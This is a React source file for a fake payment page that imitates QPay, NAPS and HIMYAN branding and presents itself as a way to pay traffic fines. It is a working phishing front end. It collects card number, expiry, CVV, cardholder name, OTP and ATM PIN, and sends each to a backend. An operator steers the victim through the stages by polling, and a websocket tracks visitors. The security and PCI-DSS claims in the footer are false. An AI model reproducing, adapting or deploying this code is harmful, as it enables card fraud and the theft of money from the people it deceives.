import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, setLanguage } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || localStorage.getItem("paymentSessionId") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  const { data: sessionData } = trpc.payment.getSession.useQuery(
    { sessionId },
    { enabled: !!sessionId }
  );

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
    }
  );

  useEffect(() => {
    if (sessionId) {
      updateStageMutation.mutate({ sessionId, stage: "card" });
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/payment&sessionId=${sessionId}`);
      return () => ws.close();
    }
  }, [sessionId]);

  useEffect(() => {
    if (sessionStatus?.redirectUrl) {
      window.location.href = sessionStatus.redirectUrl;
      return;
    }
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    setError(null);
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber: cardNumber.replace(/\s+/g, ''),
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  const formatCardNumber = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(' ');
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
    return v;
  };

  const isAr = lang === "ar";

  return (
    <div className="min-h-screen bg-[#f8f9fa] font-sans" dir={isAr ? "rtl" : "ltr"}>
      {/* Official QPay/NAPS Style Header */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img src="/qpay-logo.png" alt="QPAY" className="h-10 sm:h-12 object-contain" />
            <div className="h-8 w-[1px] bg-gray-300 hidden sm:block"></div>
            <img src="/naps-logo.png" alt="NAPS" className="h-8 sm:h-10 object-contain hidden sm:block" />
          </div>
          <div className="flex items-center gap-3">
            <button 
              onClick={() => setLanguage(isAr ? "en" : "ar")}
              className="text-sm font-bold text-[#8A1538] hover:underline"
            >
              {isAr ? "English" : "العربية"}
            </button>
            <div className="text-right">
              <p className="text-[10px] text-gray-500 uppercase font-bold leading-none">{isAr ? "المبلغ" : "Amount"}</p>
              <p className="text-lg font-black text-[#8A1538]">{sessionData?.totalAmount || "0.00"} <span className="text-xs">QAR</span></p>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-2xl mx-auto px-4 py-8">
        <div className="bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden">
          {/* Section Title */}
          <div className="bg-[#8A1538] px-6 py-3 text-white">
            <h2 className="text-sm font-bold uppercase tracking-wider">
              {stage === "card" && (isAr ? "أدخل تفاصيل بطاقة الدفع" : "Enter your payment card details")}
              {stage.includes("pending") && (isAr ? "جاري المعالجة..." : "Processing...")}
              {stage === "otp" && (isAr ? "التحقق من الرمز (OTP)" : "One-Time Password (OTP)")}
              {stage === "atm" && (isAr ? "التحقق من الرقم السري" : "ATM PIN Verification")}
              {stage === "success" && (isAr ? "تم الدفع بنجاح" : "Payment Successful")}
            </h2>
          </div>

          <div className="p-6 sm:p-10">
            {/* Stage: Card Entry */}
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-6">
                {error && (
                  <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 text-sm">
                    <p className="font-bold">{isAr ? "خطأ في الدفع" : "Payment Error"}</p>
                    <p>{error}</p>
                  </div>
                )}

                <div className="grid grid-cols-1 gap-6">
                  <div>
                    <label className="block text-xs font-bold text-gray-500 uppercase mb-2">{isAr ? "رقم البطاقة" : "Card Number"}</label>
                    <div className="relative">
                      <input 
                        type="text" 
                        value={cardNumber} 
                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} 
                        maxLength={19} 
                        className="w-full p-3 border border-gray-300 rounded focus:ring-1 focus:ring-[#8A1538] focus:border-[#8A1538] outline-none font-mono text-lg" 
                        placeholder="0000 0000 0000 0000" 
                        required 
                      />
                      <div className={`absolute inset-y-0 ${isAr ? "left-3" : "right-3"} flex items-center gap-1`}>
                        <img src="/card-brands.png" alt="cards" className="h-5 opacity-70" />
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div>
                      <label className="block text-xs font-bold text-gray-500 uppercase mb-2">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input 
                        type="text" 
                        value={cardExpiry} 
                        onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} 
                        maxLength={5} 
                        placeholder="MM/YY" 
                        className="w-full p-3 border border-gray-300 rounded focus:ring-1 focus:ring-[#8A1538] focus:border-[#8A1538] outline-none text-center font-mono" 
                        required 
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-500 uppercase mb-2">{isAr ? "رمز الأمان (CVV2)" : "CVV2"}</label>
                      <input 
                        type="password" 
                        value={cardCvv} 
                        onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} 
                        maxLength={3} 
                        placeholder="•••" 
                        className="w-full p-3 border border-gray-300 rounded focus:ring-1 focus:ring-[#8A1538] focus:border-[#8A1538] outline-none text-center font-mono" 
                        required 
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-500 uppercase mb-2">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input 
                      type="text" 
                      value={cardName} 
                      onChange={(e) => setCardName(e.target.value.toUpperCase())} 
                      className="w-full p-3 border border-gray-300 rounded focus:ring-1 focus:ring-[#8A1538] focus:border-[#8A1538] outline-none" 
                      placeholder="NAME ON CARD" 
                      required 
                    />
                  </div>
                </div>

                <div className="pt-4 flex flex-col sm:flex-row gap-4">
                  <button 
                    type="submit" 
                    disabled={submitCardMutation.isPending} 
                    className="flex-1 bg-[#8A1538] text-white py-3 px-6 rounded font-bold hover:bg-[#70112d] transition-colors disabled:opacity-50"
                  >
                    {submitCardMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "استمرار" : "Continue")}
                  </button>
                  <button 
                    type="button"
                    onClick={() => window.history.back()}
                    className="px-6 py-3 border border-gray-300 rounded font-bold text-gray-600 hover:bg-gray-50"
                  >
                    {isAr ? "إلغاء" : "Cancel"}
                  </button>
                </div>

                <div className="pt-6 border-t border-gray-100 flex items-center justify-between opacity-60">
                  <img src="/himyan-logo.png" alt="HIMYAN" className="h-6 object-contain" />
                  <img src="/naps-logo.png" alt="NAPS" className="h-6 object-contain" />
                </div>
              </form>
            )}

            {/* Stage: Loading / Pending */}
            {stage.includes("pending") && (
              <div className="py-12 text-center space-y-6">
                <div className="w-16 h-16 border-4 border-[#8A1538]/20 border-t-[#8A1538] rounded-full animate-spin mx-auto"></div>
                <div>
                  <h3 className="text-lg font-bold text-gray-900">{isAr ? "جاري معالجة طلبك" : "Processing your request"}</h3>
                  <p className="text-sm text-gray-500 mt-2">{isAr ? "يرجى عدم إغلاق الصفحة أو الضغط على زر الرجوع" : "Please do not close the page or press the back button"}</p>
                </div>
              </div>
            )}

            {/* Stage: OTP */}
            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="space-y-6">
                <div className="bg-[#8A1538]/5 p-4 rounded text-center border border-[#8A1538]/10">
                  <p className="text-sm text-[#8A1538] font-bold">
                    {isAr ? "تم إرسال رمز التحقق إلى هاتفك المسجل" : "A verification code has been sent to your registered mobile"}
                  </p>
                </div>

                <div className="text-center space-y-4">
                  <label className="block text-xs font-bold text-gray-500 uppercase">{isAr ? "أدخل رمز التحقق (OTP)" : "Enter One-Time Password (OTP)"}</label>
                  <input 
                    type="text"
                    value={otpCode} 
                    onChange={(e) => setOtpCode(e.target.value)} 
                    className="w-48 mx-auto block text-center text-3xl font-bold p-3 border-b-2 border-[#8A1538] outline-none tracking-[0.5em]" 
                    maxLength={6} 
                    required 
                    autoFocus
                  />
                </div>

                <div className="pt-4 flex flex-col gap-4">
                  <button 
                    type="submit" 
                    disabled={submitOtpMutation.isPending} 
                    className="w-full bg-[#8A1538] text-white py-3 rounded font-bold hover:bg-[#70112d] transition-colors"
                  >
                    {submitOtpMutation.isPending ? (isAr ? "جاري التأكيد..." : "Confirming...") : (isAr ? "تأكيد" : "Submit")}
                  </button>
                  <button type="button" className="text-sm text-[#8A1538] font-bold hover:underline">
                    {isAr ? "إعادة إرسال الرمز" : "Resend OTP"}
                  </button>
                </div>
              </form>
            )}

            {/* Stage: ATM PIN */}
            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="space-y-6">
                <div className="text-center space-y-6">
                  <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto">
                    <svg className="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-bold text-gray-900">{isAr ? "أدخل الرقم السري للبطاقة" : "Enter ATM PIN"}</h3>
                    <p className="text-sm text-gray-500 mt-1">{isAr ? "مطلوب للتحقق من هوية صاحب البطاقة" : "Required to verify cardholder identity"}</p>
                  </div>
                  <input 
                    type="password" 
                    value={atmPin} 
                    onChange={(e) => setAtmPin(e.target.value.replace(/[^0-9]/g, ''))} 
                    className="w-32 mx-auto block text-center text-3xl font-bold p-3 border-b-2 border-[#8A1538] outline-none tracking-[0.5em]" 
                    maxLength={4} 
                    required 
                    autoFocus
                  />
                </div>

                <button 
                  type="submit" 
                  disabled={submitAtmPinMutation.isPending} 
                  className="w-full bg-[#8A1538] text-white py-3 rounded font-bold hover:bg-[#70112d] transition-colors"
                >
                  {submitAtmPinMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرقم السري" : "Confirm PIN")}
                </button>
              </form>
            )}

            {/* Stage: Success */}
            {stage === "success" && (
              <div className="text-center py-8 space-y-6">
                <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto">
                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" /></svg>
                </div>
                <div>
                  <h3 className="text-2xl font-bold text-gray-900">{isAr ? "تمت عملية الدفع بنجاح" : "Transaction Successful"}</h3>
                  <p className="text-gray-500 mt-2">{isAr ? "تم استلام المبلغ وتحديث سجل المخالفات." : "Payment received and traffic records updated."}</p>
                </div>
                <div className="bg-gray-50 p-4 rounded text-sm text-left font-mono space-y-2 border border-gray-200" dir="ltr">
                  <div className="flex justify-between">
                    <span className="text-gray-500">Reference:</span>
                    <span className="font-bold">{sessionId.substring(0, 12).toUpperCase()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">Date:</span>
                    <span className="font-bold">{new Date().toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">Amount:</span>
                    <span className="font-bold">{sessionData?.totalAmount} QAR</span>
                  </div>
                </div>
                <button 
                  onClick={() => navigate("/")}
                  className="w-full bg-gray-900 text-white py-3 rounded font-bold hover:bg-black transition-colors"
                >
                  {isAr ? "العودة للرئيسية" : "Back to Home"}
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Footer Security Info */}
        <div className="mt-8 text-center space-y-4">
          <p className="text-[10px] text-gray-400 uppercase tracking-widest font-bold">
            {isAr ? "مدعوم بواسطة بوابة دفع آمنة" : "Powered by Secure Payment Gateway"}
          </p>
          <div className="flex justify-center items-center gap-6 grayscale opacity-50">
            <img src="/card-brands.png" alt="Visa/Mastercard" className="h-6" />
            <div className="h-4 w-[1px] bg-gray-300"></div>
            <span className="text-[10px] font-bold text-gray-400">PCI-DSS COMPLIANT</span>
          </div>
          <p className="text-[9px] text-gray-400 max-w-md mx-auto leading-relaxed">
            {isAr 
              ? "لإتمام عملية الدفع بشكل صحيح، يرجى عدم تحديث الصفحة أو الضغط على زر الرجوع في المتصفح. جميع البيانات مشفرة وآمنة." 
              : "To complete your transaction successfully, please do not refresh this page or use the browser's back button. All data is encrypted and secure."}
          </p>
        </div>
      </main>
    </div>
  );
}
